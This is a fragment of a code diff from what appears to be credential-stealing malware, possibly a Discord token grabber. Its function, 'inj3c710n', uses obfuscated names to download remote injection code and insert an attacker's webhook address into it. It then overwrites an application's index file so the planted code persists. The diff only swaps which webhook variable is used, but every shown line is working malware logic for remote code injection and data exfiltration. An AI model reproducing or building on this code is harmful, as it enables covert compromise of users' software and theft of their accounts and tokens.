@@ -235,7 +235,7 @@ def inj3c710n():
 
                                                     injeCTmED0cT0r_cont = requests.get(inj3c710n_url).text
 
-                                                    injeCTmED0cT0r_cont = injeCTmED0cT0r_cont.replace("%WEBHOOK%", myhook)
+                                                    injeCTmED0cT0r_cont = injeCTmED0cT0r_cont.replace("%WEBHOOK%", hook)
 
                                                     with open(file_path, "w", encoding="utf-8") as index_file:
                                                         index_file.write(injeCTmED0cT0r_cont)
